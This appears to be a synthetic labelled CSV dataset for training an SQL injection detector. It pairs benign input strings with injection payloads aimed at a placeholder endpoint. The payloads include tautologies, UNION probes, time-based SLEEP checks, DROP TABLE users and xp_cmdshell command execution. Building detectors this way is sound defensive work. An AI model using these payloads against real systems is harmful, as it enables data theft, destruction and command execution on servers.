url,param,value,label
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --196",1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --193",1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --349",1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --132,1
http://vuln.com/api,input,product_list223,0
http://vuln.com/api,input,feedback_form335,0
http://vuln.com/api,input,' OR 1=1/*90,1
http://vuln.com/api,input,invoice_2024286,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--7,1
http://vuln.com/api,input,' AND SLEEP(5); --446,1
http://vuln.com/api,input,' AND SLEEP(5); --415,1
http://vuln.com/api,input,letmein116,0
http://vuln.com/api,input,john362,0
http://vuln.com/api,input,letmein319,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --63,1
http://vuln.com/api,input,email=admin@example.com499,0
http://vuln.com/api,input,' OR 1=1#156,1
http://vuln.com/api,input,'; DROP TABLE users; --155,1
http://vuln.com/api,input,' OR NOT 1=2 --420,1
http://vuln.com/api,input,' OR 1=1 --249,1
http://vuln.com/api,input,export_data51,0
http://vuln.com/api,input,' OR 'a'='a1,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --276,1
http://vuln.com/api,input,invoice_2024424,0
http://vuln.com/api,input,' OR 1=1 --473,1
http://vuln.com/api,input,hello123115,0
http://vuln.com/api,input,contact_us8,0
http://vuln.com/api,input,' OR NOT 1=2 --353,1
http://vuln.com/api,input,admin256,0
http://vuln.com/api,input,contact_us50,0
http://vuln.com/api,input,download_report491,0
http://vuln.com/api,input,' AND SLEEP(5); --442,1
http://vuln.com/api,input,' OR 1=1 --223,1
http://vuln.com/api,input,contact_us131,0
http://vuln.com/api,input,reset_password181,0
http://vuln.com/api,input,email=admin@example.com351,0
http://vuln.com/api,input,admin' --251,1
http://vuln.com/api,input,search_item377,0
http://vuln.com/api,input,' OR 1=1#456,1
http://vuln.com/api,input,export_data7,0
http://vuln.com/api,input,john372,0
http://vuln.com/api,input,admin221,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--165,1
http://vuln.com/api,input,' OR 1=1/*179,1
http://vuln.com/api,input,' OR 1=1 --119,1
http://vuln.com/api,input,' OR 1=1#417,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--319,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--300,1
http://vuln.com/api,input,letmein384,0
http://vuln.com/api,input,admin266,0
http://vuln.com/api,input,admin196,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --329,1
http://vuln.com/api,input,search_item96,0
http://vuln.com/api,input,' OR '' = ''30,1
http://vuln.com/api,input,search_item49,0
http://vuln.com/api,input,' OR 'a'='a200,1
http://vuln.com/api,input,'; DROP TABLE users; --253,1
http://vuln.com/api,input,john399,0
http://vuln.com/api,input,' OR NOT 1=2 --296,1
http://vuln.com/api,input,invoice_2024233,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --443",1
http://vuln.com/api,input,product_list55,0
http://vuln.com/api,input,admin' --144,1
http://vuln.com/api,input,' OR NOT 1=2 --387,1
http://vuln.com/api,input,export_data332,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --68",1
http://vuln.com/api,input,search_item207,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--274,1
http://vuln.com/api,input,logout275,0
http://vuln.com/api,input,download_report217,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --176,1
http://vuln.com/api,input,feedback_form118,0
http://vuln.com/api,input,logout431,0
http://vuln.com/api,input,feedback_form126,0
http://vuln.com/api,input,reset_password82,0
http://vuln.com/api,input,search_item374,0
http://vuln.com/api,input,update_profile145,0
http://vuln.com/api,input,email=admin@example.com42,0
http://vuln.com/api,input,invoice_2024394,0
http://vuln.com/api,input,export_data120,0
http://vuln.com/api,input,invoice_2024299,0
http://vuln.com/api,input,'; DROP TABLE users; --153,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --83",1
http://vuln.com/api,input,' OR 'a'='a255,1
http://vuln.com/api,input,invoice_2024250,0
http://vuln.com/api,input,' AND SLEEP(5); --27,1
http://vuln.com/api,input,'; DROP TABLE users; --110,1
http://vuln.com/api,input,admin' --382,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --194,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--330,1
http://vuln.com/api,input,' OR 1=1 --248,1
http://vuln.com/api,input,' OR 1=1/*397,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --158,1
http://vuln.com/api,input,' OR 1=1/*191,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --233,1
http://vuln.com/api,input,invoice_202454,0
http://vuln.com/api,input,feedback_form244,0
http://vuln.com/api,input,' OR 1=1 --130,1
http://vuln.com/api,input,logout13,0
http://vuln.com/api,input,' OR 1=1/*459,1
http://vuln.com/api,input,admin' --54,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--245,1
http://vuln.com/api,input,product_list269,0
http://vuln.com/api,input,' AND SLEEP(5); --183,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --383,1
http://vuln.com/api,input,update_profile279,0
http://vuln.com/api,input,' OR 1=1/*467,1
http://vuln.com/api,input,letmein408,0
http://vuln.com/api,input,' OR '' = ''199,1
http://vuln.com/api,input,email=admin@example.com37,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--342,1
http://vuln.com/api,input,contact_us293,0
http://vuln.com/api,input,' AND SLEEP(5); --188,1
http://vuln.com/api,input,hello123367,0
http://vuln.com/api,input,hello123114,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--149,1
http://vuln.com/api,input,contact_us323,0
http://vuln.com/api,input,reset_password404,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--375,1
http://vuln.com/api,input,search_item418,0
http://vuln.com/api,input,update_profile411,0
http://vuln.com/api,input,' OR 1=1 --290,1
http://vuln.com/api,input,logout97,0
http://vuln.com/api,input,feedback_form52,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --9,1
http://vuln.com/api,input,contact_us171,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--447,1
http://vuln.com/api,input,' OR 'a'='a32,1
http://vuln.com/api,input,product_list18,0
http://vuln.com/api,input,logout206,0
http://vuln.com/api,input,product_list437,0
http://vuln.com/api,input,reset_password471,0
http://vuln.com/api,input,update_profile262,0
http://vuln.com/api,input,invoice_2024304,0
http://vuln.com/api,input,' OR 1=1/*189,1
http://vuln.com/api,input,' OR 1=1#427,1
http://vuln.com/api,input,search_item480,0
http://vuln.com/api,input,' OR 1=1 --78,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--481,1
http://vuln.com/api,input,feedback_form350,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --494",1
http://vuln.com/api,input,search_item29,0
http://vuln.com/api,input,feedback_form353,0
http://vuln.com/api,input,' AND SLEEP(5); --454,1
http://vuln.com/api,input,' AND SLEEP(5); --244,1
http://vuln.com/api,input,' AND SLEEP(5); --170,1
http://vuln.com/api,input,reset_password320,0
http://vuln.com/api,input,' OR NOT 1=2 --348,1
http://vuln.com/api,input,john184,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --286",1
http://vuln.com/api,input,reset_password108,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--493,1
http://vuln.com/api,input,letmein228,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --268",1
http://vuln.com/api,input,search_item80,0
http://vuln.com/api,input,john71,0
http://vuln.com/api,input,letmein197,0
http://vuln.com/api,input,'; DROP TABLE users; --461,1
http://vuln.com/api,input,' OR NOT 1=2 --408,1
http://vuln.com/api,input,invoice_2024450,0
http://vuln.com/api,input,logout295,0
http://vuln.com/api,input,' OR 'a'='a115,1
http://vuln.com/api,input,' OR '' = ''62,1
http://vuln.com/api,input,export_data33,0
http://vuln.com/api,input,hello1233,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--292,1
http://vuln.com/api,input,invoice_2024427,0
http://vuln.com/api,input,invoice_2024414,0
http://vuln.com/api,input,update_profile100,0
http://vuln.com/api,input,update_profile135,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --332,1
http://vuln.com/api,input,update_profile208,0
http://vuln.com/api,input,logout463,0
http://vuln.com/api,input,contact_us143,0
http://vuln.com/api,input,' OR 1=1#345,1
http://vuln.com/api,input,export_data500,0
http://vuln.com/api,input,download_report195,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--171,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --64",1
http://vuln.com/api,input,search_item378,0
http://vuln.com/api,input,hello123179,0
http://vuln.com/api,input,export_data341,0
http://vuln.com/api,input,john268,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --5,1
http://vuln.com/api,input,' OR 1=1 --65,1
http://vuln.com/api,input,' AND SLEEP(5); --82,1
http://vuln.com/api,input,export_data280,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--26,1
http://vuln.com/api,input,download_report63,0
http://vuln.com/api,input,admin383,0
http://vuln.com/api,input,reset_password15,0
http://vuln.com/api,input,' OR 1=1#485,1
http://vuln.com/api,input,search_item81,0
http://vuln.com/api,input,' AND SLEEP(5); --4,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --117,1
http://vuln.com/api,input,invoice_20246,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --411,1
http://vuln.com/api,input,' AND SLEEP(5); --139,1
http://vuln.com/api,input,'; DROP TABLE users; --136,1
http://vuln.com/api,input,'; DROP TABLE users; --177,1
http://vuln.com/api,input,' OR 1=1#430,1
http://vuln.com/api,input,admin' --187,1
http://vuln.com/api,input,reset_password34,0
http://vuln.com/api,input,admin' --11,1
http://vuln.com/api,input,'; DROP TABLE users; --455,1
http://vuln.com/api,input,contact_us343,0
http://vuln.com/api,input,reset_password38,0
http://vuln.com/api,input,export_data461,0
http://vuln.com/api,input,'; DROP TABLE users; --272,1
http://vuln.com/api,input,download_report122,0
http://vuln.com/api,input,' AND SLEEP(5); --6,1
http://vuln.com/api,input,email=admin@example.com129,0
http://vuln.com/api,input,invoice_2024241,0
http://vuln.com/api,input,john445,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--321,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --104",1
http://vuln.com/api,input,export_data401,0
http://vuln.com/api,input,' AND SLEEP(5); --265,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--24,1
http://vuln.com/api,input,'; DROP TABLE users; --466,1
http://vuln.com/api,input,letmein281,0
http://vuln.com/api,input,' OR 1=1/*125,1
http://vuln.com/api,input,feedback_form402,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--69,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --463,1
http://vuln.com/api,input,' OR 1=1#444,1
http://vuln.com/api,input,email=admin@example.com481,0
http://vuln.com/api,input,' OR '' = ''164,1
http://vuln.com/api,input,letmein76,0
http://vuln.com/api,input,update_profile310,0
http://vuln.com/api,input,feedback_form216,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --79",1
http://vuln.com/api,input,invoice_2024175,0
http://vuln.com/api,input,' OR 1=1#407,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--289,1
http://vuln.com/api,input,download_report27,0
http://vuln.com/api,input,' OR 'a'='a316,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --8,1
http://vuln.com/api,input,letmein212,0
http://vuln.com/api,input,email=admin@example.com321,0
http://vuln.com/api,input,invoice_2024440,0
http://vuln.com/api,input,' OR '' = ''351,1
http://vuln.com/api,input,export_data91,0
http://vuln.com/api,input,feedback_form204,0
http://vuln.com/api,input,' OR '' = ''17,1
http://vuln.com/api,input,'; DROP TABLE users; --13,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --108,1
http://vuln.com/api,input,'; DROP TABLE users; --282,1
http://vuln.com/api,input,feedback_form234,0
http://vuln.com/api,input,download_report342,0
http://vuln.com/api,input,' OR '' = ''367,1
http://vuln.com/api,input,' OR NOT 1=2 --495,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--180,1
http://vuln.com/api,input,invoice_2024132,0
http://vuln.com/api,input,logout407,0
http://vuln.com/api,input,' OR 1=1 --56,1
http://vuln.com/api,input,contact_us243,0
http://vuln.com/api,input,hello123278,0
http://vuln.com/api,input,admin' --275,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --399,1
http://vuln.com/api,input,logout263,0
http://vuln.com/api,input,search_item476,0
http://vuln.com/api,input,logout315,0
http://vuln.com/api,input,john380,0
http://vuln.com/api,input,admin' --219,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --357,1
http://vuln.com/api,input,' OR 1=1#86,1
http://vuln.com/api,input,admin17,0
http://vuln.com/api,input,reset_password439,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --33",1
http://vuln.com/api,input,letmein133,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --169",1
http://vuln.com/api,input,contact_us291,0
http://vuln.com/api,input,reset_password172,0
http://vuln.com/api,input,hello12344,0
http://vuln.com/api,input,download_report386,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --192",1
http://vuln.com/api,input,' OR 'a'='a261,1
http://vuln.com/api,input,email=admin@example.com103,0
http://vuln.com/api,input,search_item326,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --106",1
http://vuln.com/api,input,email=admin@example.com336,0
http://vuln.com/api,input,email=admin@example.com74,0
http://vuln.com/api,input,contact_us188,0
http://vuln.com/api,input,export_data300,0
http://vuln.com/api,input,update_profile316,0
http://vuln.com/api,input,export_data253,0
http://vuln.com/api,input,update_profile255,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --147,1
http://vuln.com/api,input,hello123452,0
http://vuln.com/api,input,logout189,0
http://vuln.com/api,input,export_data415,0
http://vuln.com/api,input,' AND SLEEP(5); --462,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --210,1
http://vuln.com/api,input,' OR 'a'='a95,1
http://vuln.com/api,input,' OR NOT 1=2 --497,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --57",1
http://vuln.com/api,input,contact_us487,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --372,1
http://vuln.com/api,input,' OR 1=1/*99,1
http://vuln.com/api,input,' OR 1=1 --437,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --161",1
http://vuln.com/api,input,' OR 1=1#212,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --186",1
http://vuln.com/api,input,' OR 'a'='a29,1
http://vuln.com/api,input,download_report494,0
http://vuln.com/api,input,search_item361,0
http://vuln.com/api,input,download_report65,0
http://vuln.com/api,input,' AND SLEEP(5); --436,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --313,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --402,1
http://vuln.com/api,input,' OR 1=1 --42,1
http://vuln.com/api,input,search_item246,0
http://vuln.com/api,input,admin432,0
http://vuln.com/api,input,invoice_202435,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --114",1
http://vuln.com/api,input,reset_password10,0
http://vuln.com/api,input,export_data12,0
http://vuln.com/api,input,' OR NOT 1=2 --452,1
http://vuln.com/api,input,export_data62,0
http://vuln.com/api,input,export_data48,0
http://vuln.com/api,input,john387,0
http://vuln.com/api,input,john130,0
http://vuln.com/api,input,hello123403,0
http://vuln.com/api,input,admin138,0
http://vuln.com/api,input,feedback_form59,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --52,1
http://vuln.com/api,input,download_report419,0
http://vuln.com/api,input,' OR '' = ''431,1
http://vuln.com/api,input,download_report360,0
http://vuln.com/api,input,email=admin@example.com292,0
http://vuln.com/api,input,export_data344,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--270,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --314",1
http://vuln.com/api,input,admin' --336,1
http://vuln.com/api,input,' OR 1=1#120,1
http://vuln.com/api,input,export_data303,0
http://vuln.com/api,input,'; DROP TABLE users; --474,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--22,1
http://vuln.com/api,input,contact_us465,0
http://vuln.com/api,input,product_list134,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --395",1
http://vuln.com/api,input,download_report191,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --197,1
http://vuln.com/api,input,search_item230,0
http://vuln.com/api,input,hello123288,0
http://vuln.com/api,input,download_report21,0
http://vuln.com/api,input,invoice_2024457,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--419,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --299",1
http://vuln.com/api,input,contact_us413,0
http://vuln.com/api,input,search_item462,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --309",1
http://vuln.com/api,input,search_item331,0
http://vuln.com/api,input,product_list313,0
http://vuln.com/api,input,logout144,0
http://vuln.com/api,input,admin' --46,1
http://vuln.com/api,input,john201,0
http://vuln.com/api,input,update_profile222,0
http://vuln.com/api,input,' OR NOT 1=2 --441,1
http://vuln.com/api,input,'; DROP TABLE users; --498,1
http://vuln.com/api,input,' OR 1=1#380,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --390",1
http://vuln.com/api,input,logout412,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --237,1
http://vuln.com/api,input,' OR 'a'='a47,1
http://vuln.com/api,input,search_item312,0
http://vuln.com/api,input,letmein338,0
http://vuln.com/api,input,admin77,0
http://vuln.com/api,input,product_list156,0
http://vuln.com/api,input,reset_password160,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --400,1
http://vuln.com/api,input,email=admin@example.com121,0
http://vuln.com/api,input,update_profile456,0
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--39,1
http://vuln.com/api,input,' OR 1=1#451,1
http://vuln.com/api,input,' OR 1=1/*440,1
http://vuln.com/api,input,' OR 1=1 --146,1
http://vuln.com/api,input,'; DROP TABLE users; --34,1
http://vuln.com/api,input,' OR NOT 1=2 --234,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --107,1
http://vuln.com/api,input,email=admin@example.com99,0
http://vuln.com/api,input,search_item264,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --423,1
http://vuln.com/api,input,letmein435,0
http://vuln.com/api,input,contact_us87,0
http://vuln.com/api,input,' OR 'a'='a217,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--346,1
http://vuln.com/api,input,product_list105,0
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --162",1
http://vuln.com/api,input,'; DROP TABLE users; --355,1
http://vuln.com/api,input,invoice_2024192,0
http://vuln.com/api,input,' OR 1=1/*35,1
http://vuln.com/api,input,' OR 'a'='a315,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --337",1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --484",1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--371,1
http://vuln.com/api,input,' OR 1=1/*306,1
http://vuln.com/api,input,' OR NOT 1=2 --121,1
http://vuln.com/api,input,' OR NOT 1=2 --138,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--469,1
http://vuln.com/api,input,' AND SLEEP(5); --205,1
http://vuln.com/api,input,feedback_form239,0
http://vuln.com/api,input,logout298,0
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --229,1
http://vuln.com/api,input,logout236,0
http://vuln.com/api,input,download_report209,0
http://vuln.com/api,input,export_data117,0
http://vuln.com/api,input,' OR NOT 1=2 --297,1
http://vuln.com/api,input,search_item110,0
http://vuln.com/api,input,' OR 'a'='a457,1
http://vuln.com/api,input,admin474,0
http://vuln.com/api,input,' OR 1=1#133,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --291",1
http://vuln.com/api,input,logout368,0
http://vuln.com/api,input,feedback_form410,0
http://vuln.com/api,input,' OR 1=1 --398,1
http://vuln.com/api,input,'; DROP TABLE users; --45,1
http://vuln.com/api,input,' OR 1=1/*70,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --81,1
http://vuln.com/api,input,export_data107,0
http://vuln.com/api,input,logout333,0
http://vuln.com/api,input,admin' --85,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --435",1
http://vuln.com/api,input,update_profile31,0
http://vuln.com/api,input,' UNION ALL SELECT NULL--460,1
http://vuln.com/api,input,' OR NOT 1=2 --370,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --428,1
http://vuln.com/api,input,feedback_form148,0
http://vuln.com/api,input,' OR NOT 1=2 --323,1
http://vuln.com/api,input,update_profile249,0
http://vuln.com/api,input,hello123379,0
http://vuln.com/api,input,' OR '' = ''369,1
http://vuln.com/api,input,admin301,0
http://vuln.com/api,input,' OR 'a'='a488,1
http://vuln.com/api,input,invoice_2024473,0
http://vuln.com/api,input,feedback_form75,0
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --80",1
http://vuln.com/api,input,' OR 1=1 --160,1
http://vuln.com/api,input,hello123152,0
http://vuln.com/api,input,search_item492,0
http://vuln.com/api,input,download_report163,0
http://vuln.com/api,input,' OR 1=1/*48,1
http://vuln.com/api,input,' OR '' = ''100,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--250,1
http://vuln.com/api,input,email=admin@example.com497,0
http://vuln.com/api,input,' OR NOT 1=2 --20,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --433",1
http://vuln.com/api,input,' UNION ALL SELECT NULL--487,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--230,1
http://vuln.com/api,input,' OR 1=1 --450,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --66",1
http://vuln.com/api,input,letmein22,0
http://vuln.com/api,input,contact_us199,0
http://vuln.com/api,input,' OR 1=1 --198,1
http://vuln.com/api,input,update_profile112,0
http://vuln.com/api,input,email=admin@example.com185,0
http://vuln.com/api,input,invoice_202469,0
http://vuln.com/api,input,invoice_2024475,0
http://vuln.com/api,input,' OR '' = ''102,1
http://vuln.com/api,input,logout139,0
http://vuln.com/api,input,' OR 'a'='a201,1
http://vuln.com/api,input,' OR 'a'='a352,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --491",1
http://vuln.com/api,input,'; DROP TABLE users; --326,1
http://vuln.com/api,input,' OR '' = ''148,1
http://vuln.com/api,input,contact_us359,0
http://vuln.com/api,input,reset_password441,0
http://vuln.com/api,input,' OR 'a'='a258,1
http://vuln.com/api,input,' AND SLEEP(5); --98,1
http://vuln.com/api,input,logout485,0
http://vuln.com/api,input,' OR 'a'='a449,1
http://vuln.com/api,input,"' UNION SELECT NULL,NULL,NULL --448",1
http://vuln.com/api,input,' OR 'a'='a221,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --173,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --279,1
http://vuln.com/api,input,'; DROP TABLE users; --424,1
http://vuln.com/api,input,contact_us127,0
http://vuln.com/api,input,' OR 1=1#55,1
http://vuln.com/api,input,letmein70,0
http://vuln.com/api,input,' OR 1=1#51,1
http://vuln.com/api,input,admin' --489,1
http://vuln.com/api,input,update_profile64,0
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --360,1
http://vuln.com/api,input,' OR 1=1 --267,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--204,1
http://vuln.com/api,input,hello12361,0
http://vuln.com/api,input,email=admin@example.com16,0
http://vuln.com/api,input,' OR 'a'='a458,1
http://vuln.com/api,input,' OR EXISTS(SELECT * FROM users) --324,1
http://vuln.com/api,input,'; DROP TABLE users; --14,1
http://vuln.com/api,input,invoice_2024106,0
http://vuln.com/api,input,' OR '' = ''453,1
http://vuln.com/api,input,product_list388,0
http://vuln.com/api,input,'; DROP TABLE users; --25,1
http://vuln.com/api,input,"' OR ASCII(SUBSTRING(@@version,1,1))=52 --72",1
http://vuln.com/api,input,admin318,0
http://vuln.com/api,input,' OR 1=1 --195,1
http://vuln.com/api,input,' UNION ALL SELECT NULL--284,1
http://vuln.com/api,input,' OR 1=1/*335,1
http://vuln.com/api,input,logout168,0
http://vuln.com/api,input,product_list26,0
http://vuln.com/api,input,update_profile265,0
http://vuln.com/api,input,' OR 1=1/*434,1
http://vuln.com/api,input,letmein68,0
http://vuln.com/api,input,admin' --285,1
http://vuln.com/api,input,logout274,0
http://vuln.com/api,input,admin468,0
http://vuln.com/api,input,export_data200,0
http://vuln.com/api,input,download_report358,0
http://vuln.com/api,input,' OR NOT 1=2 --15,1
http://vuln.com/api,input,product_list215,0
http://vuln.com/api,input,letmein66,0
http://vuln.com/api,input,' OR 'a'='a44,1
http://vuln.com/api,input,'; EXEC xp_cmdshell('dir'); --418,1
http://vuln.com/api,input,' OR 1=1 ORDER BY 1--259,1
http://vuln.com/api,input,reset_password454,0
